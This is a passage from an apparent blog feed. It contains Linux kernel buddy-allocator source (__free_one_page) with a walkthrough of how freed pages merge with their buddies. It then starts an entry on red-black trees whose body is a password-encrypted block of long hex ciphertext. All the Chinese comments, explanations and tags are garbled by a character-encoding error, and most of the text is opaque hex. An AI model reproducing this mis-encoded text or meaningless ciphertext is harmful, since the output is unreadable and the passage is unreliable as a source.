class="hljs-keyword">if</span> (!page_is_buddy(page, buddy, order))  <span class="hljs-comment">// æ£€æŸ¥ page å’Œ buddy æ˜¯å¦æ˜¯ä¸€å¯¹</span><br><span class="hljs-keyword">goto</span> done_merging;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æˆ‘ä»¬çš„ buddyï¼ˆè¯‘æ³¨ï¼šé‡Šæ”¾é¡µé¢çš„â€œé…å¯¹â€é¡µé¢ï¼Œå¯ä»¥çœ‹å¼€å¤´çš„æ³¨é‡Šï¼‰ æ˜¯ç©ºé—²çš„</span><br><span class="hljs-comment"> * æˆ–å…¶ä¸º CONFIG_DEBUG_PAGEALLOC çš„ guard pageï¼Œ</span><br><span class="hljs-comment"> * ä¸å…¶åˆå¹¶åå‡åˆ°é«˜ä¸€çº§çš„orderã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (page_is_guard(buddy))<br>clear_page_guard(zone, buddy, order, migratetype);<br><span class="hljs-keyword">else</span><br>del_page_from_free_list(buddy, zone, order);<br>combined_pfn = buddy_pfn &amp; pfn;<br>page = page + (combined_pfn - pfn);<br>pfn = combined_pfn;<br>order++;<br>&#125;<br><span class="hljs-keyword">if</span> (order &lt; MAX_ORDER - <span class="hljs-number">1</span>) &#123;<br><span class="hljs-comment">/* è‹¥æˆ‘ä»¬åˆ°äº†è¿™ï¼Œè¿™æ„å‘³ç€ order &gt;= pageblock_order.</span><br><span class="hljs-comment"> * æˆ‘ä»¬æƒ³è¦é¢„é˜²åœ¨å¸¸è§„ pageblock ä¸ç‹¬ç«‹çš„pageblock ä¹‹é—´çš„åˆå¹¶ã€‚</span><br><span class="hljs-comment"> * æ²¡æœ‰è¿™ä¸ªï¼Œpageblockéš”ç¦»å¯èƒ½é€ æˆé”™è¯¯çš„ç©ºé—²é¡µæˆ–CMAè®¡æ•°. </span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æˆ‘ä»¬ä¸æƒ³ä¸ºäº†æ›´é¢‘ç¹çš„ä½é˜¶åˆå¹¶ä½¿ç”¨è¿™ä¸ªä»£ç </span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(has_isolate_pageblock(zone))) &#123;<br><span class="hljs-type">int</span> buddy_mt;<br><br>buddy_pfn = __find_buddy_pfn(pfn, order);<br>buddy = page + (buddy_pfn - pfn);<br>buddy_mt = get_pageblock_migratetype(buddy);<br><br><span class="hljs-keyword">if</span> (migratetype != buddy_mt<br>&amp;&amp; (is_migrate_isolate(migratetype) ||<br>is_migrate_isolate(buddy_mt)))<br><span class="hljs-keyword">goto</span> done_merging;<br>&#125;<br>max_order = order + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">goto</span> continue_merging;<br>&#125;<br><br>done_merging:<br>set_buddy_order(page, order); <span class="hljs-comment">// åœ¨ page-&gt;private ä¸­å‚¨å­˜å…¶ order</span><br><br>    <span class="hljs-comment">// åˆ¤æ–­æ˜¯æ’åˆ°é“¾è¡¨å¤´è¿˜æ˜¯é“¾è¡¨å°¾ï¼Œé€šå¸¸æ˜¯é“¾è¡¨å¤´ï¼Œå³éµå¾ª LIFO</span><br><span class="hljs-keyword">if</span> (fpi_flags &amp; FPI_TO_TAIL)<br>to_tail = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (is_shuffle_order(order))<br>to_tail = shuffle_pick_tail();<br><span class="hljs-keyword">else</span><br>        <span class="hljs-comment">// è¯¥å‡½æ•°ä¼šæ£€æŸ¥æ˜¯å¦ä¸‹ä¸€ä¸ªæœ€é«˜é˜¶çš„ buddy æ˜¯å¦ç©ºé—²</span><br>        <span class="hljs-comment">// è‹¥æ˜¯ï¼Œåˆ™å¯èƒ½æ­£åœ¨é‡Šæ”¾çš„é¡µé¢å—å°†å¾ˆå¿«è¢«åˆå¹¶ï¼Œæ­¤æ—¶æˆ‘ä»¬åº”å½“å°†å…¶æ·»åŠ åˆ°é“¾è¡¨çš„å°¾éƒ¨</span><br>        <span class="hljs-comment">// è¿™æ ·å°±ä¸å¤§å¯èƒ½åˆè¢«åˆ«çš„è¿›ç¨‹å¾ˆå¿«å°±åˆ†é…èµ°äº†ï¼Œè€Œæ˜¯å¯èƒ½è¢«åˆå¹¶ä¸ºé«˜é˜¶é¡µé¢</span><br>to_tail = buddy_merge_likely(pfn, buddy_pfn, page, order);<br><br>    <span class="hljs-comment">// æ’å…¥ç‰¹å®šè¿ç§»é“¾è¡¨</span><br><span class="hljs-keyword">if</span> (to_tail)<br>add_to_free_list_tail(page, zone, order, migratetype);<br><span class="hljs-keyword">else</span><br>add_to_free_list(page, zone, order, migratetype);<br><br><span class="hljs-comment">/* Notify page reporting subsystem of freed page */</span><br><span class="hljs-keyword">if</span> (!(fpi_flags &amp; FPI_SKIP_REPORT_NOTIFY))<br>page_reporting_notify_free(order);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†ä¸å¾…é‡Šæ”¾é¡µé¢å‡‘æˆä¸€å¯¹çš„å†…å­˜å—ç§°ä¸º buddyï¼Œæ‰€è°“å‡‘æˆä¸€å¯¹ä¾¿æ˜¯<strong>è¿™ä¸¤ä¸ªå†…å­˜å—åœ¨ç‰©ç†ä¸Šè¿ç»­ï¼Œä¸”èƒ½å‡‘æˆä¸€ä¸ªæ›´é«˜ä¸€é˜¶çš„å¤§å†…å­˜å—</strong>ï¼Œç”±æ­¤ç§°ä¹‹ä¸ºä¸€å¯¹ buddies</p><p>è¯¥å‡½æ•°ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ï¼ˆcontinue_mergingï¼Œå¾ªç¯å¼€å¤´ï¼‰è°ƒç”¨ <code>__find_buddy_pfn()</code> è®¡ç®—å¾…é‡Šæ”¾é¡µé¢çš„ buddy çš„ç¬¬ä¸€å¼ ç‰©ç†é¡µçš„é¡µæ¡†å·ï¼Œç®—æ³•æ¯”è¾ƒæš´åŠ›ï¼š<code>page_pfn ^ (1 &lt;&lt; order)</code></li><li>è°ƒç”¨ <code>page_is_buddy()</code> æ£€æŸ¥ buddy ä¸ å¾…é‡Šæ”¾é¡µé¢æ˜¯å¦æ˜¯ä¸€å¯¹ buddiesï¼Œè‹¥å¦ï¼Œåˆ™è·³åˆ°ï¼ˆdone_mergingï¼‰ï¼Œè¿™é‡Œçš„æ£€æŸ¥éœ€è¦æ»¡è¶³å››ä¸ªè¦ç´ ï¼š<ul><li>buddy ä¸åœ¨ç©ºæ´ä¸­</li><li>buddy åœ¨ buddy system ä¸­ï¼ˆå³ buddy ä¹Ÿæ˜¯ç©ºé—²å†…å­˜å—ï¼‰</li><li>å¾…é‡Šæ”¾é¡µé¢ä¸å…¶ buddy åœ¨åŒä¸€ä¸ª zone ä¸­</li><li>å¾…é‡Šæ”¾é¡µé¢ä¸å…¶ buddy æœ‰ç€åŒæ ·çš„é˜¶ï¼ˆorderï¼‰</li></ul></li><li>è‹¥ buddy ä¸º guard pageï¼Œåˆ™è°ƒç”¨ <code>clear_page_guard()</code> æ¸…æ¥šè¿™ä¸ªå±æ€§è®©å…¶å˜æˆç©ºé—²é¡µé¢ï¼Œè¿™é‡Œæ¸…é™¤çš„æ“ä½œæ˜¯é€šè¿‡å°† page ç»“æ„ä½“çš„ private å­—æ®µç½® 0 å®ç°çš„ï¼›è‹¥å¦ï¼Œåˆ™è¯´æ˜æ˜¯å¸¸è§„çš„ç©ºé—²é¡µé¢ï¼Œè°ƒç”¨ <code>del_page_from_free_list()</code> å°†å…¶è„±é“¾</li><li>æ­¤æ—¶æˆ‘ä»¬çš„æ–°çš„é«˜é˜¶å†…å­˜å—å°±å®Œæˆåˆæˆäº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å›åˆ°å¾ªç¯å¼€å¤´é‡æ–°å¯»æ‰¾è¿™ä¸ªåˆæˆçš„æ–°å†…å­˜å—çš„ buddyï¼Œè¿™ä¸ªå¾ªç¯ä¸€ç›´æŒç»­åˆ° <code>max_order</code> ï¼ˆä¸€èˆ¬æ˜¯10ï¼‰ï¼Œä½œä¸ºä¸‹ä¸€æ¬¡å¾ªç¯çš„é¡µæ¡†å·çš„è®¡ç®—æ–¹å¼æ˜¯ <code>buddy_pfn &amp; pfn</code>ï¼Œä¹‹ååšæŒ‡é’ˆè¿ç®— <code>page + (combined_pfn - pfn)</code> æ‰¾åˆ°å¯¹åº”çš„ page ç»“æ„ä½“</li><li>è‹¥é€€å‡ºå¾ªç¯æ—¶çš„ order æ»¡è¶³ <code>order &lt; MAX_ORDER - 1</code> ï¼Œåˆ™è°ƒç”¨ <code>has_isolate_pageblock()</code> æ£€æŸ¥ zone ä¸­æ˜¯å¦æœ‰ isolate blockï¼Œè‹¥æ˜¯åˆ™è¿›è¡Œç›¸å…³æ“ä½œï¼ˆ<del>è¿™å—ä»£ç è¿˜æ²¡çœ‹æ‡‚</del>ï¼‰ï¼Œæœ€åè·³è½¬å›ï¼ˆcontinue_mergingï¼‰ï¼›è¿™ä¸€æ­¥ä¸»è¦æ˜¯é˜²æ­¢ isolate pageblock ä¸å¸¸è§„çš„ pageblock å‘ç”Ÿåˆå¹¶</li><li>ï¼ˆdone_mergingï¼‰è¿™ä¸€æ­¥ä¸»è¦æ˜¯è°ƒç”¨ <code>set_buddy_order()</code> åœ¨ page ç»“æ„ä½“çš„ private å­—æ®µå­˜æ”¾è¯¥å†…å­˜å—çš„ order</li><li>è‹¥æ˜¯è®¾ç½®äº† <code>FPI_TO_TAIL</code> flagï¼Œåˆ™å°† <code>to_tail</code> ç½®ä¸º trueï¼›å¦åˆ™ï¼Œè‹¥å†…å­˜å—çš„ <code>order &gt;= SHUFFLE_ORDER</code>ï¼ˆ<code>MAX_ORDER - 1</code>ï¼‰ï¼Œåˆ™å°† <code>to_tail</code> ç½®ä¸ºéšæœºç»“æœï¼ˆ<code>shuffle_pick_tail()</code>ï¼‰ï¼›å¦åˆ™ç½®ä¸ºè°ƒç”¨ <code>buddy_merge_likely()</code> çš„ç»“æœï¼Œè¯¥å‡½æ•°ä¼šæ£€æŸ¥æ˜¯å¦ä¸‹ä¸€ä¸ªæœ€é«˜é˜¶çš„ buddy æ˜¯å¦ç©ºé—²ï¼Œè‹¥æ˜¯ï¼Œåˆ™å¯èƒ½æ­£åœ¨é‡Šæ”¾çš„é¡µé¢å—å°†å¾ˆå¿«è¢«åˆå¹¶ï¼Œæ­¤æ—¶æˆ‘ä»¬åº”å½“å°†å…¶æ·»åŠ åˆ°é“¾è¡¨çš„å°¾éƒ¨ï¼Œè¿™æ ·å°±ä¸å¤§å¯èƒ½åˆè¢«åˆ«çš„è¿›ç¨‹å¾ˆå¿«å°±åˆ†é…èµ°äº†ï¼Œè€Œæ˜¯å¯èƒ½è¢«åˆå¹¶ä¸ºé«˜é˜¶é¡µé¢</li><li>è‹¥ <code>to_tail</code> ä¸ºçœŸï¼Œåˆ™è°ƒç”¨ <code>add_to_free_list_tail()</code> å°†è¯¥ç©ºé—²é¡µæ·»åŠ åˆ°é“¾è¡¨æœ«å°¾ï¼Œå¦åˆ™è°ƒç”¨ <code>add_to_free_list()</code> æ·»åŠ åˆ°é“¾è¡¨å¼€å¤´</li></ul><h2 id="äºŒã€ä¸Šå±‚å°è£…å‡½æ•°"><a href="#äºŒã€ä¸Šå±‚å°è£…å‡½æ•°" class="headerlink" title="äºŒã€ä¸Šå±‚å°è£…å‡½æ•°"></a>äºŒã€<em>ä¸Šå±‚å°è£…å‡½æ•°</em></h2><p>æ‰€æœ‰é¡µé¢é‡Šæ”¾çš„å‡½æ•°å…¶å®éƒ½æ˜¯å¯¹ <code>__free_one_page()</code> çš„å°è£…ï¼Œæœ€ç»ˆéƒ½ä¼šè°ƒç”¨åˆ°è¿™ä¸ªå‡½æ•°ï¼Œè·¯å¾„å¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/07/06/ktV7cNlohiQCSWP.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;HEY DUDE!&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="http://blog.arttnba3.cn/categories/OS/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="å­¦ä¹ æœ­è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="å†…å­˜ç®¡ç†" scheme="http://blog.arttnba3.cn/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
    <category term="buddy system" scheme="http://blog.arttnba3.cn/tags/buddy-system/"/>
    
  </entry>
  
  <entry>
    <title>ã€ALGORITHM.0x04ã€‘ä»äºŒå‰æœç´¢æ ‘åˆ°çº¢é»‘æ ‘</title>
    <link href="http://blog.arttnba3.cn/2022/05/28/ALGORITHM-0X04-RED_BLACK_TREE/"/>
    <id>http://blog.arttnba3.cn/2022/05/28/ALGORITHM-0X04-RED_BLACK_TREE/</id>
    <published>2022-05-27T21:50:46.000Z</published>
    <updated>2022-08-28T20:46:56.787Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å¯†ç å‡ºé”™å•¦ï¼" data-whm="è¿˜è¯·ä¸è¦åšä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„äº‹æƒ…ï¼">  <script id="hbeData" type="hbeData" data-hmacdigest="34f01c8b30823cf2c49dd6b881dac2b5e318081ca58d030d376f6e97dbe5cc74">afdbd80b698a50e90523fd700308ec65f44e06d46f63079433cfca60657b16ff93bb2b1a04d8edd7ab5ff0d1b5476a6fd26393991a7feb303675f276bef9bd6d95051256b4233fa4340b26aa06280f64514ab8c3b30fa20ac5118fcb917d57ad3b481c5c43dd420e88cf175e2bce126ca7455645d534362aa994abb13840873a37663e8b81b982c07841c33324b08b12b6f9e408b86735ee54ba9778c62bb56800f1576484673f5a74e0c404176bcc45bce18c91cc268793a759e3f42a7371803e83d9bec68e1787cfcae81d0d40155bec8ea944f76fc70766fef9eba27a88423ec1cb22596090ad16dce1f9b273d9fca901029e3caef77f644fa69102f8fc40624811236eb96ced5b894d6d12c72e4e8f481c40641c4c361ed34c3e01611e6afac1028efd46b20846f89bc09388f39b44901b1718ecaa3e341a378e7c9536c90d8a4c2335596607bac029ea5df4f08068752d7fdebefb83c9f1f6e5857066fa344bc26c954482057917acd1738a56add0abc05609608b67402fe13f2937d7bff6c3421d07bb97962ffe6f2a928e99ed168cf98e304fda7001238747a9937921a4854cde5f196a128ccf656f526f52391a3ade33179216029e7f9cb2196609919d42a360d3e19360e5c87e5ac562cc5c4b80a8a0628e4b12588ef34028bc9b068960e9d10b55885977b219e65272c3399ef7bde3c97d8fb131d2a96bdc82e472f415aa7aeb8ac859b48a44b3c6d4d37c6c6c191eba3f6eb311b3c4e2e4a47539a29c87c1e83ded2f89758fddb540937155396443310d8fd39cf224a1a2df3c2cc90243052b9fbe77b7139a184c719d720c675ef36fd754c08aab35e2e988f4221874f9c9ce9e1f2fefc223a458a62b9b2c43621fa0ac4fb70b63ea5405a23b8888ab9a8fc61af9f8bf65be4ad4c74b69bce172073bfe6060a5599961be6037c5e68c31f4d9d9d45bc39995873f4ab69bfe27da6563ddc45a9a397dbb2e4393ea1faf9ee90b6f0d46ac304560e1560fd0c9b9cc38afe3674fd486fb07e1833e5bd562d5e729efda52aa95453ab8298a8ad04375898ab3311ee7086db7013af5405051dbf080c5e04190d6dbe8e8dbacbe88868e722592ec3d86183f3f0242351ce660a3469830fbd6177095202f3353840186d8270028efc7f450d191a69ad1fe713e8c7d129250d950bbdc8fa309550946c460741b22ea44dbd702cd5b1fa1ee26861cf2c09c107cbe6ba760e2744eb51561ac898343eccd715573c41618cdecb839108688e2e399a8373413ab587a4813dd1ff92b1cc969c36531a9b745cfb659b2312143f5eb76e538e726da551ffb4b1b3122b4bbd327103dc4d19e8fc4afc1035c58489711a9290ccd11d18660fe09a0589e025c5204e8b407e3799e6be400b3c78a110684807630ce112927ec8a5997ac621757134c34de14eb60f5e8a6588e6cdbf1b11a69154716742b2801ca9573de6d10094cc9340f19580f0fe2f1f6cecd9dbd2cb64e613d9cad1ccb995c1300a0eb1874602588ae627c0dbff16ad30e8e36655bed515f2b6f1f7e72a941fc5dcd284e9ee4654700e02afb92bb15005ba79d6a6e24eefa5a23009cc12d1ec42488452a39b73fd9594439c1f9fa3fadd3c9eb7f4ec8a937fa3c1d4ae49f1dcbc0cb8b7ef24bafa1f847879b20ba5c6ea8c1d9485017d20638d8e9a46e4dc8793e2c7dca2ffd845120dffef2a90aa3447d9750f0d38d145a7c658276c45cd0757397d32a7cdb101a37eac891452a7bc1437ddf56d2dde76a87477ec198672b3c27de67fd8873e16c0bf5f00822302cd4a0fb6e861c2ecfe6102ea6bedda14cf5be61d4453e0a3057a2471ae8047b38bb23a54e2b61640d3ea58c80f7c5c9626a108914d64b91c8588fcce80d284717b55d00059e2e65877beed47732b80fab0c3cb5b9f09c0cfd8b99f421bd25b1baef1804175f6a29b174ced750995f5f5aefc494f815922f5e537b712aa488da6929ae88291aa2f157d2110183191ab8e97370cdf5885e7e116c950c5e51950cb1925e51bb29ad0ba927556985031120d35d64ee3c8214f11ba602497f934d9e32e6c978cb5924d878520c2f9b155ec1892e1c14ff9d2164984a0ef27911e6dd47d7ee7a7c5d47e7b84b7c09006a42b1c71c673af82cb6dd776a4982e0a52d3f22c51010ede6c43c1e01a5a5df2acb806666b3d02f9512b24e9f6ed34c1f0a7554e1084e609af6eccf87592e7f4c13ead67ca704f073ed333c6a439e98d8e6b5940de6145c21dc21634524c30050edbcae335fca691c3762646a0ee351c95fe709fa8407f6f616c549410b8c7aaac737457161275dba74e2de298df42e1983dc7e4192203eebf4f7572e13157cb43cefc3f81b6ebce1f053f1f04bb44d9c63052695efb24e8081b8f59ed155818be8c8e421631ef032f911fcabc34d73c0c7371e038a5876e5d8a341d2a6160c22249cdbfb682cb7e1514be3e83b707f3829a3680c516935e56db1085e6667440cad76e73c47820d9c31707ca47fafc9ad67b12a206386c848306eb31b7a4278d7d57149c9a00ee5e6ba383192c39ec01a4d1ea162eca1d1fcd91ad92c2dc701aea8a23c62b933149bce6196d87a485d52bd4389276e414f9462cacb529d85c65c0394c85f3627b6c19bdfa06abd220e1dd9184dd8b0af7b15e79bb9d8361b84c3cf28e6742d24463e746280c6d5273c7513a822cd45122aeb4dc595efe5412548f483a9c1184ce7b66f20715883c354c1893a022e511ad435b9fdf67040d1a8d4cac7f692fc2eefdf8fdb40608a515031d56e54cb63c643bdfc05cc7b62d02bbb11d3b93f3706a141e242a0cd29449ecca7604d38d86cf7d62a39153e166515e3933e6c08c998cfc703a3b57bf5101fa01cfd4cd7c48b26a5bd0a26ff1504390852719de6cce318b09e6b19252fe3508163822946328db422646ecfa28ebbe19800ca985bc437cc3aa88e9c174b3b9b07c151df298fc831e154987847dc8811c0a9840b1e7657689c3f39abcb3802d63018f5796dcec9a102bb03f56601aad9e8e5d4229490863d517ca7898a39a3e48ae60649d2ed97c126e408fa38f61ff4af5d21eb1463bb4bf003f2906b38e39dba02ecfad467eb360d18dcb9ca4abd91f27b247f487aa0f3effebe9e3dbb6f857322b5ed98d4434e9feefa85377ebe04f0d7848ff53ca61a3a755ca60e078d382ea65cccd2b8d680985733e7564f28d4a8d07c22eefa72cfa14ac75cd89d59d9e7092a7c0eb8fc930220a6474bc69e214dfca7074fec3f0b10bfcda623535ce173e068166d6c736c0c69119044c9c5e649f11cb5f9c4414117f9b8f709ee7ce7ef510301b77398bef943ec98c09648ad1c5ebe53763ad3b7f54e7e5ad8a452f054271c15b56c1e81d8ab5b250d275da2cf977b6a20e8bab8c8079ef9a462935583958b42220910d21b8f9410a949cab367087b9bfd14beb76c54d8ba9b0223e0e3b0b3b9611f0f8fb83183c1966af78b6a86a78c495e8b03c952904765b664579515c6213d873793ca27bf940cb3d945106a9ae4f75e354ee07be3225c9fd9b5b339334be10a06783e5f35cd9b179d85c9b9cbfb55482d7c3601cc59096aeb042feef68eddaa1f31bace90b1459249e79484b4dd10c683ce3b5efcc582d0af3365c0029364c5768becee185db102afa8921a1ffd6c90023614527c4d4368f3c9d6574031e857d0c5301f0712a363d57b84d302021840174ea9ac95cca5c3be65839a67a1ef661790c7f1cb635978b06e030aabd4f7df82e6b68717c056d4640923e1579a2931876fa7904f7c3076ff945990dd131cd1accecb9e773eebbfc970d0cb8932aad7dec1df6c0279a58dd3b3c2370667803845bf543fded5877108d1797224980a216c443a77fa4ac10c37ca0a59b54adf75395aa50fee1aec3982dac06db545f796b82bd12ee891250fd1f91587c93223543cb9bf47a3b872644c59f848324bf14cb747e780e725ac9ecebab8bb7bbd4eaee40fb009892ab4e44db917b3c8499f8e378957dc90802ac97ee3cd0caea98461fbe86c41d13853fd39171b9cc8696dd7e0577fa5dc37ae88ee55c4dd18d3c03e36ab22c79ef86bf72820077dbd907587e4efebb0c02ccfc12943de9c7e07c4bbc664103fc701198537507e4165721c4abe6fdbeb793d4ae9a6ba5cdca5c377524133eb689374dfe01e1c27436b40de7797d24d9776fcbe8a4a0867356db8c37740afeb2a4b437e8dab6f5c9f149c7968474d1654c562728b8401ad33d1c404cf8f306d822718ddfb853cd72eb5360ba640b3526af856f568e6d666a92772ef7041f35b7d7b60ee088e9a5f79d5de90de1b1b9f856b3517bf1c8fa1e748d935509640cdaccfcbfb74015eaf047062db6855b11d90a4ca067209c5d7cb4f837dc6aac9b73869f6b17dac5acff5ff26c5b87af17e58f31e766a47b0cdadbf390aaddaf9b289f285e86823e30fdf17577f4d2c0b2328e8d0f6325a55585e5309e3645e5af0709addcb7d847863d3708894b607fe2082cedb94f23790f04bf58c85194253470a0d2e0f4c92987dff056a294838562d5559fdc97baaa357f49326018ee5cca9f7a302bcd14aede1620a02ecb1102375fef037d60432c4605f0db2e7337ce1fea3000b3e31f122d672316c9f3ab054bb2ada3cba14b225cfef1c87fbbcea2deeeaa472a91d3c7fdec9f2923394586c5e8def4664d8ef80721f16b7164563cc5eba0fb68c26e5ba70755b2f4d743eb431e5e2a9a57232b87a5d010bcc551bc79a5c595a53ab67db647755b9279fe6213e5240c992f8fbfce77a61c5afb51fda0becc7013edb881d43a0bb566410d8a4441657a77a95e840fe0a218b8c655d93b9994e425364e1b9319d984400df0f6fd375e19a38c7d2d017ce5e4fc538300b44c30cf1867ca67fb1ba5205c9dc7ccc3e5cd767c19df30dbcfff0290a444a0fb02d14ebb26b4bc78f58fa9328ceb869d6a73309e4719b37f972492d5a9ce925e9066fa672f3b321e819ab47ba4478250a61178ede2c0e660c8c71e19fde4ddb0bf5d1301e954e1c20f7528968517bc93d9dba397b05147813cd1423036f28e98adfe17b8f1f0791c80158773af82892f47c9bca38d8e5ba26ee4d1cbdb5b8f029b9021fac67d449fb5a2e6f4e4a19ad0683c27a1ea6dd1aebe8569b0abdbec73de4d872637d9a6df80b987ebe2b850e06260a8ef16066595e741f4202a56e6ab0cc2c6bc8caa689cac578228bd46fd52aec586a354d38e10827067200fbae34f2f73d9d355ba2f0eb77b2af7d07da7b2a6bd6855b97f822e791043dce611b61bf06506b625e30e9e2d681b4b1f71dabec54eef6c1bdd55255dd4b46ac78e3a06c28de32ded55053bfffe4e317525d94d8dc602c11fac11d067457a7ce5e1ab7a54c17447fa4bb7547fb0be08a4e08b93519b7e0935ebbf40b3e7646f1d132237d2ffcb55db2d9a0a41689a5c478e40cb6dddb53107d28128969cbab9679121226057888e92a547d69fc3e63ed74f685f3668fc33d6492b7b0da23126e854fffbb052e6e85ce8b66799bca2fc3c19427f145e6da2880d869fa9eba47f8a6c0e1c2b2bc458763f6ef6897dbd0a434f75d7bf918209c437932b1bf1dd10da112d9d22a4fee80c3851337e3b8aa79563f0a0f002e8d2b10be6021d993f7bbc6b308c5e7f957455f9bbc804b5bab1ba5d2f4cfa21ee98062e3bbd5d8d0ca80bbff63a224c546f236bf6e207168522efe838bffea347e44420ddb7949c1264fd8ec356f7f0e0cb4468cbe61b53a2c805000d31a7e073e26da3c07f714de29f90bde199d4c1c75c8e487ec31033abe3ea89034be925c73912ec3b58bd661978334ca95fa13b2ceedae753dc7efac8d4a169a0c40aa0a6592bd99d4e01056c860c2bbd9bfdd2c8c675b7e172ad2974eac30b4f4cac45a18e1e7d1f1f58744554726e35be3d2071567d48ddf70d7d7a16c8f390b0d45d96585309c223cb717d73e61e74c51e5f0b6f6d4193cc534d1ba4709e672f686a07675cfb02d532c2b90ce8da9f033b9aa09a7da587c3ade262251f4d740b0f56df96d080e045cb6d99eac499517174c846328e0179e7496c700e078cf578047902341d56e55e83e1e8390a1008fe10ff3abdfaf8cbf31f9c00bf9e792c5dfd8e3a24d9a8b5e9447c72b944284d6d1120673882d8b3f39e79666d6c3d2ec87c2d80da550ae6fa745859dfcd9698dc5ba1ab581caaf02daf16e4008126e94e81ced4c812597451788a7b482205d9deb02157f30a1efac8c0b0cb964fc77b0533e9283a23e7ba2ed72e3cb918032314e97930df265322ca95f789c67bf1c592a0b470cea3015ec7c21e5bc6401d184200362107cb4d8dac230ade4df2dfe0b471ab213225fa9f0a12936610bc846408da087154e3d4d2b60bfb0f62034c95a5a2fc98fb8b0dc4d4074a24280648b53f033d86663275bb552f0cb32334047c957a17d392c6a0f1d519982c99911bbdef06d4a22f5bf2119c8f1fe51c2290a2567e3c81a150c633fe7c5a093e8324c9376770c8a55ec5975dbdf046c5420c229e480b18c01b1ac5ea5aa82e60f7f33115331567a8daf2fca22bcb10b6d70000a17aeb2d0accbea423a45ce7a0a3ab6a54d90a4afb3e0531635fa48173cea6db89c03d86b280d932bbbaf207992849fb1bd0671637e93180d41d642af4a6f63c14b7be6d9ee7b1629ba6bc607b7ab568a6c5df3741f207b276db08587a5ae1f392313c559fcb047771c5a5adc57077f80918cde2565fc14f1877902ac693757ec6daf9d5671148ff6d2d7051637fef4baf00b539cfc61820a39a485c4077980a188f87572305f49bfdf41ba4cca7e39027230bdaf3906ce9ab70a65e3d0fcf5b84cbb54cc2a954b32d592f1e2ab1b544b8952b2fdba1e72aea42c2127d4aad4d5577af94e56e6179c7dea6c5071ca35a472f77ec8531ff1b01d949ac291b4c5963eb6e043f2b93241e7d5b0727e9d5e25d0749f578bd1095996a6d4b9d3f897fa29a41c7eeff56575c651846633753cb0e7f3ee915c536e04104bcb604c62bca9e31c16edc4ec9304e31e7b3d992371bd33b8c4b79a8aa1bfb11fe26713e1eb219f7167424a00c190177a9ddc8f911d123a365521d504af33bdaf770960b83bf86e4fc266f9e904b92aa26e4ac7c99134b56a2438a8da924a4137774007ad6480963b44798768b727117ec90237c1237d3af2f894fd61af4e282aaa23c893838259c1b63b7a119cff294d6d63dcc33b78d72590f237bde39fcf8f8f41eb884cd7d254e8d9653050e62a675292b1314c8b94acbca9f29886991cec81fc79a7c41e3a1dd146d99d9297f9978c205664107445ba0d18f119094526d714523b9e35f984855f1fb29b725e8903bba06fb7b86d72237e0641de3b79ab3dfbfc1b8e44405c0eec56201ddb8b5530640f31e2b1a6ae6436810b5960f5b7590787bc9bc5d8811fc6056fc5b8e056cac2fd56566425144fe15e6aca0af86212556c1e5a6a94ec6a83c686327ff28e5df7682122c0afd4b3e01d31eefcfc14ebb8c875456dd4126260530c6dbe6e2e4a1f989ef76519f096abd3307cd2c3f2af043d9051bf96c7ad8a0efac3370c3f6067ecb2ae18c13a2b045a86b9611d6078ce1503105e5d194b4e0c23aa2939d4e3d08a2ee9bf6cd8a73d90439d48c2aa3fef3d374c0a4d2f67109335665adbb339ba36423605660c65c1322bbc6db06160ee1b6dc970453678218d0ea2eb388dc1131836b92053c30ddb362108af865d4a26d6005f78973c74de8fd0a536c7532326bf9c62fca5fbf90056922041f7e9ce8d227c8c5bd26b0bf02b4c5be88304eec243686fa2643dcb6a9958f9b77c25f59e7936bde4a51edf1ecccd942f4032180a665dcd7240ffc791092a1a5e30c8198c2eee5130744850dbe0775c965a2e49779c4a1f2f3e9a0b1396f75300fe6e75da18c6b21d2b948241d72ab00e7f7c392e2b0185630f23320d2e82e44ffae81dcd57915e839d3d0713efe4e42235096385d18ff69558e3cfa47cd2c6f5034831b7ccd83b591e287e4b07991174582a34038c47c3567c519b7052b1dafff0ad6efb63a0996bde9fefe73225657f6086bdd78c1ea085e8c2b5b0a41c3e512958028fee4ff6be93830b19cb9e4aa488a6b3597484cd8d898e4ddead72dc2dbaa490aa506a6870f6031215cecdbf22a59aa077eb20b0f1b1647da7eedecd608c9eb9422405f6e4d50fade5238c641a7281885947ee0c5dc28974a620a9bbb72f1c5aa47181ef74d2d2702beea47830cebedb3f6a0b19b0fc38e8533f6a88ad02515b64f4e5be33c8aaae9e3b026ea0226af96c38da98446249f27db0afa5efe0574b248b98c5f33eeeaa1edd6fe25427af473794d6144431f99d41f0c1a511ed64367355aec1e1ad931aa48784f2cd06aae18073608ae761d4a08231440027156d2e1d86170b2be9617286f925c86f4f396160621d2206cd71fb63fb2143c550910336a32ee84d6e7b8447848a2368eec48a71a1d6e592fe9b0f82631aa1307e60622d7ae201eecd850ce8e25848df1d685ee116580f79f366a04a0f55acb768c073ba1eeaa286d7e6f10b9abe1f928673f0dcc82cddf18a5b9992d7750c91ffff05c1ee708e004d88d89fa4b035389f9bef04ff5aff8a593db59bde89c6905cd576077660c58e9fbe1b78bcb97958e5a07a1261ff6490c39c3370d4ae34ad374f79bfc972b824379df86b4086c1d2e23b1e7fa02a06ca81f8659bc1d934ed91fde10989ab30f69d9381398bf4b86abd3171522cdba06cb7f0fe5bb00ccf05fb1475ced6